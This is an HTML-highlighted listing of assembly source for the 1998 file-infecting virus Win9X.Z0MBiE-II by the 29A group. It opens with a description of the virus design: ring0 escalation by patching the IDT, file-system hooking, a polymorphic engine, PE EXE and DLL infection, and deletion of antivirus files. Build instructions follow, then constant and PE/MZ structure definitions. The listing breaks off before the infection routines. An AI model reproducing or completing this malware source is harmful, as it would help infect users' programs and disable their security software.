<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Z0MBIE2.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Win9X.Z0MBiE-II                            copyright (c) 1998 by Z0MBiE/29A</span><span class="sc0">
</span><span class="sc1">; made in Moscow, Russia                                 z0mbie_29a@yahoo.com</span><span class="sc0">
</span><span class="sc1">;      *** NOT FOR [RE]PUBLISHING IN VX ZINES IN ANY FORM, EXCEPT 29A ***</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc1">; Waves, big like a house</span><span class="sc0">
</span><span class="sc1">; They're stranded on a piece of wood</span><span class="sc0">
</span><span class="sc1">; To leave it all behind</span><span class="sc0">
</span><span class="sc1">; To start again</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; But instead of a new life</span><span class="sc0">
</span><span class="sc1">; All they find is a door that's closed</span><span class="sc0">
</span><span class="sc1">; And they keep looking for</span><span class="sc0">
</span><span class="sc1">; A place called hope</span><span class="sc0">
</span><span class="sc1">;                    Scorpions</span><span class="sc0">

</span><span class="sc1">;                          *** VIRUS DESCRIPTION ***</span><span class="sc0">
</span><span class="sc1">; on program load:</span><span class="sc0">
</span><span class="sc1">;   - process polymorphic decryptor</span><span class="sc0">
</span><span class="sc1">;   - allocate some stack for vars, make copy of unmodified virus</span><span class="sc0">
</span><span class="sc1">;   - patch IDT/int 0d address, then execute INT 0D - we`re in ring0</span><span class="sc0">
</span><span class="sc1">;   - if infection method #1:</span><span class="sc0">
</span><span class="sc1">;      - restore program code section attributes using _PageModifyPermissions</span><span class="sc0">
</span><span class="sc1">;      - restore program code replaced by virus body</span><span class="sc0">
</span><span class="sc1">;   - allocate memory using _PageAlloc, go to new location</span><span class="sc0">
</span><span class="sc1">;   - using _PageModifyPermissions make our pages unaccessible from ring3</span><span class="sc0">
</span><span class="sc1">;   - init handlers using _FileSystemApiHook &amp; _Hook_PM_Fault</span><span class="sc0">
</span><span class="sc1">;   - return to program/dll</span><span class="sc0">
</span><span class="sc1">; on FS call, IFSFN_OPEN/IFSFN_RENAME/IFSFN_FILEATTRIB</span><span class="sc0">
</span><span class="sc1">;   - infect PE-EXE &amp; PE-DLL files</span><span class="sc0">
</span><span class="sc1">;       - infecting with previously (at startup) saved copy of virus</span><span class="sc0">
</span><span class="sc1">;       - poly engine: (very simple, expanding coeff. ~2.5)</span><span class="sc0">
</span><span class="sc1">;           mov REGi, random_value</span><span class="sc0">
</span><span class="sc1">;           cmd REGj, random_value / cmd REGj, some_calculated_value</span><span class="sc0">
</span><span class="sc1">;           push REGk/push CONST</span><span class="sc0">
</span><span class="sc1">;           ...</span><span class="sc0">
</span><span class="sc1">;           jmp esp</span><span class="sc0">
</span><span class="sc1">;       - 2 methods of infection, 1st try method #1</span><span class="sc0">
</span><span class="sc1">;         1:  - find place in section with std. CODE attributes, write virus</span><span class="sc0">
</span><span class="sc1">;               there, then write encrypted original bytes from CODE section</span><span class="sc0">
</span><span class="sc1">;               to the end of last section, then increase last section's</span><span class="sc0">
</span><span class="sc1">;               physical/virtual sizes</span><span class="sc0">
</span><span class="sc1">;               this method used for std. PE-EXE files</span><span class="sc0">
</span><span class="sc1">;         2:  - add new section</span><span class="sc0">
</span><span class="sc1">;               this method used for some PE-EXE file &amp; all PE-DLL files</span><span class="sc0">
</span><span class="sc1">;     - process S&amp;D on CODE section (for only method #1)</span><span class="sc0">
</span><span class="sc1">;     - "alredy infected" sign is PE_Header.TimeStamp equal to 0</span><span class="sc0">
</span><span class="sc1">; on INT 06</span><span class="sc0">
</span><span class="sc1">;   - S&amp;D handler (for only 32-bit apps)</span><span class="sc0">
</span><span class="sc1">; other features:</span><span class="sc0">
</span><span class="sc1">;   - "active protection" - rewrite+delete some files (AV,etc) on access</span><span class="sc0">
</span><span class="sc1">;   - internal nop-filled buffer; each time fs handler is called,</span><span class="sc0">
</span><span class="sc1">;     random jmp/call from virus's body is replaced with jmp to this</span><span class="sc0">
</span><span class="sc1">;     buffer and correct jmp is stored to buffer till it has some free space</span><span class="sc0">
</span><span class="sc1">;   - Soft-ICE protection</span><span class="sc0">

</span><span class="sc1">; a) to compile virus use asm.bat</span><span class="sc0">
</span><span class="sc1">; b) tasm32 options:  /ml /m</span><span class="sc0">
</span><span class="sc1">;    tlink32 options: -Tpe -c</span><span class="sc0">

</span><span class="sc1">;                                Seek &amp; Enjoy !</span><span class="sc0">

</span><span class="sc1">;DEBUG                   equ     YEZ     ; infect only .z0m files&amp;dont kill av</span><span class="sc0">

</span><span class="sc5">vir_size_infile</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(((</span><span class="sc5">vir_size</span><span class="sc4">)*</span><span class="sc2">5</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4095</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000400032h</span><span class="sc0">

</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D500h</span><span class="sc0">  </span><span class="sc1">; Open/Create a file</span><span class="sc0">
</span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D501h</span><span class="sc0">  </span><span class="sc1">; Open/Create file in current context</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D600h</span><span class="sc0">  </span><span class="sc1">; Read a file, no context</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D601h</span><span class="sc0">  </span><span class="sc1">; Write to a file, no context</span><span class="sc0">
</span><span class="sc5">R0_READFILE_IN_CONTEXT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D602h</span><span class="sc0">  </span><span class="sc1">; Read a file, in thread context</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE_IN_CONTEXT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D603h</span><span class="sc0">  </span><span class="sc1">; Write to a file, in thread context</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D700h</span><span class="sc0">  </span><span class="sc1">; Close a file</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D800h</span><span class="sc0">  </span><span class="sc1">; Get size of a file</span><span class="sc0">
</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04E00h</span><span class="sc0">  </span><span class="sc1">; Do a LFN FindFirst operation</span><span class="sc0">
</span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04F00h</span><span class="sc0">  </span><span class="sc1">; Do a LFN FindNext operation</span><span class="sc0">
</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0DC00h</span><span class="sc0">  </span><span class="sc1">; Do a LFN FindClose operation</span><span class="sc0">
</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04300h</span><span class="sc0">  </span><span class="sc1">; Get/Set Attributes of a file</span><span class="sc0">
</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">R0_RENAMEFILE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05600h</span><span class="sc0">  </span><span class="sc1">; Rename a file</span><span class="sc0">
</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04100h</span><span class="sc0">  </span><span class="sc1">; Delete a file</span><span class="sc0">
</span><span class="sc5">R0_LOCKFILE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05C00h</span><span class="sc0">  </span><span class="sc1">; Lock/Unlock a region in a file</span><span class="sc0">
</span><span class="sc5">R0_GETDISKFREESPACE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03600h</span><span class="sc0">  </span><span class="sc1">; Get disk free space</span><span class="sc0">
</span><span class="sc5">R0_READABSOLUTEDISK</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0DD00h</span><span class="sc0">  </span><span class="sc1">; Absolute disk read</span><span class="sc0">
</span><span class="sc5">R0_WRITEABSOLUTEDISK</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0DE00h</span><span class="sc0">  </span><span class="sc1">; Absolute disk write</span><span class="sc0">


</span><span class="sc5">dta_struc</span><span class="sc0">               </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">dta_fileattr</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_creation</span><span class="sc0">       </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastaccess</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastwrite</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize_hi</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_0</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filename</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta_filename_short</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">mz_struc</span><span class="sc0">                </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">mz_id</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; MZ/ZM</span><span class="sc0">
</span><span class="sc5">mz_last512</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_num512</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_relnum</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_hdrsize</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; in PAR</span><span class="sc0">
</span><span class="sc5">mz_minmem</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_maxmem</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_ss</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_sp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_csum</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; 0</span><span class="sc0">
</span><span class="sc5">mz_ip</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_cs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_relofs</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_ovrnum</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; 0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mz_neptr</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">pe_struc</span><span class="sc0">                </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">pe_id</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 00 01 02 03  pe00</span><span class="sc0">
</span><span class="sc5">pe_cputype</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 04 05        14c..14e: i386..i586</span><span class="sc0">
</span><span class="sc5">pe_numofobjects</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 06 07</span><span class="sc0">
</span><span class="sc5">pe_datetime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 08 09 0a 0b  date/time</span><span class="sc0">
</span><span class="sc5">pe_cofftableptr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0c 0d 0e 0f</span><span class="sc0">
</span><span class="sc5">pe_cofftablesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 10 11 12 13</span><span class="sc0">
</span><span class="sc5">pe_ntheadersize</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 14 15</span><span class="sc0">
</span><span class="sc5">pe_exe_flags</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 16 17</span><span class="sc0">
                        </span><span class="sc1">; ntheader</span><span class="sc0">
</span><span class="sc5">pe_ntheader_id</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 18 19</span><span class="sc0">
</span><span class="sc5">pe_linkmajor</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 19</span><span class="sc0">
</span><span class="sc5">pe_linkminor</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 1a</span><span class="sc0">
</span><span class="sc5">pe_sizeofcode</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 1c 1d 1e 1f</span><span class="sc0">
</span><span class="sc5">pe_sizeofinitdata</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 20 21 22 23</span><span class="sc0">
</span><span class="sc5">pe_sizeofuninitdata</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 24 25 26 27</span><span class="sc0">
</span><span class="sc5">pe_entrypointrva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 28 29 2a 2b</span><span class="sc0">
</span><span class="sc5">pe_baseofcoderva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 2c 2d 2e 2f</span><span class="sc0">
</span><span class="sc5">pe_baseofdatarva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 30 31 32 33</span><span class="sc0">
</span><span class="sc5">pe_imagebase</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 34 35 36 37    align: 64k</span><span class="sc0">
</span><span class="sc5">pe_objectalign</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 39 30 3a 3b  256n &gt; power2 &gt; 512</span><span class="sc0">
</span><span class="sc5">pe_filealign</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 3c 3d 3e 3f   64k &gt; power2 &gt; 512</span><span class="sc0">
</span><span class="sc5">pe_osmajor</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 40 41</span><span class="sc0">
</span><span class="sc5">pe_osminor</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 42 43</span><span class="sc0">
</span><span class="sc5">pe_usermajor</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 44 45</span><span class="sc0">
</span><span class="sc5">pe_userminor</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 46 47</span><span class="sc0">
</span><span class="sc5">pe_subsysmajor</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 48 49</span><span class="sc0">
</span><span class="sc5">pe_subsysminor</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 4a 4b</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 4c 4d 4e 4f</span><span class="sc0">
</span><span class="sc5">pe_imagesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 50 51 52 53  align: objectalign</span><span class="sc0">
</span><span class="sc5">pe_headersize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 54 55 56 57  dosh+peh+objecttable</span><span class="sc0">
</span><span class="sc5">pe_checksum</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 58 59 5a 5b  0</span><span class="sc0">
</span><span class="sc5">pe_subsystem</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 5c 5d</span><span class="sc0">
</span><span class="sc5">pe_dllflags</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 5e 5f</span><span class="sc0">
</span><span class="sc5">pe_stackreservesize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 60 61 62 63</span><span class="sc0">
</span><span class="sc5">pe_stackcommitsize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 64 65 66 67</span><span class="sc0">
</span><span class="sc5">pe_heapreservesize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 68 69 6a 6b</span><span class="sc0">
</span><span class="sc5">pe_heapcommitsize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 6c 6d 6e 6f</span><span class="sc0">
</span><span class="sc5">pe_loaderflags</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 70 71 72 73</span><span class="sc0">
</span><span class="sc5">pe_numofrvaandsizes</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 74 75 76 77   =10h</span><span class="sc0">
                        </span><span class="sc1">; rva/sizes</span><span class="sc0">
</span><span class="sc5">pe_rvasizes</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">pe_exporttablerva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 78 79 7a 7b</span><span class="sc0">
</span><span class="sc5">pe_exporttablesize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 7c 7d 7e 7f</span><span class="sc0">
</span><span class="sc5">pe_importtablerva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 80 81 82 83</span><span class="sc0">
</span><span class="sc5">pe_importtablesize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 84 85 86 87</span><span class="sc0">
</span><span class="sc5">pe_resourcetablerva</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 88 89 8a 8b</span><span class="sc0">
</span><span class="sc5">pe_resourcetablesize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 8c 8d 8e 8f</span><span class="sc0">
</span><span class="sc5">pe_exceptiontablerva</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 90 91 92 93</span><span class="sc0">
</span><span class="sc5">pe_exceptiontablesize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 94 95 96 97</span><span class="sc0">
</span><span class="sc5">pe_securitytablerva</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 98 99 9a 9b</span><span class="sc0">
</span><span class="sc5">pe_securitytablesize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 9c 9d 9e 9f</span><span class="sc0">
</span><span class="sc5">pe_fixuptablerva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; a0 a1 a2 a3</span><span class="sc0">
</span><span class="sc5">pe_fixuptablesize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; a4 a5 a6 a7</span><span class="sc0">
</span><span class="sc5">pe_debugtablerva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; a8 a9 aa ab</span><span class="sc0">
</span><span class="sc5">pe_debugtablesize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ac ad ae af</span><span class="sc0">
</span><span class="sc5">pe_imgdescrrva</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; b0 b1 b2 b3</span><span class="sc0">
</span><span class="sc5">pe_imgdescrsize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; b4 b5 b6 b7</span><span class="sc0">
</span><span class="sc5">pe_machinerva</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; b8 b9 ba bb</span><span class="sc0">
</span><span class="sc5">pe_machinesize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; bc bd be bf</span><span class="sc0">
</span><span class="sc5">pe_tlsrva</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; c0 c1 c2 c3</span><span class="sc0">
</span><span class="sc5">pe_tlssize</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; c4 c5 c6 c7</span><span class="sc0">
</span><span class="sc5">pe_loadcfgrva</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; c8 c9 ca cb</span><span class="sc0">
</span><span class="sc5">pe_loadcfgsize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; cc cd ce cf</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; d0 d1 d2 d3 d4 d5 d6 d7</span><span class="sc0">
</span><span class="sc5">pe_iattablerva</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; d8 d9 da db</span><span class="sc0">
</span><span class="sc5">pe_iattablesize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; dc dd de df</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; e0 e1 e2 e3 d4 e5 e6 e7</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; e8 e9 ea eb ec ed ee ef</span><span class="sc0">
                        </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; f0 f1 f2 f3 f4 f5 f6 f7</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">oe_struc</span><span class="sc0">                </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">oe_section_name</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;00 01 02 03 04 05 06 07</span><span class="sc0">
</span><span class="sc5">oe_virt_size</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 08 09 0a 0b</span><span class="sc0">
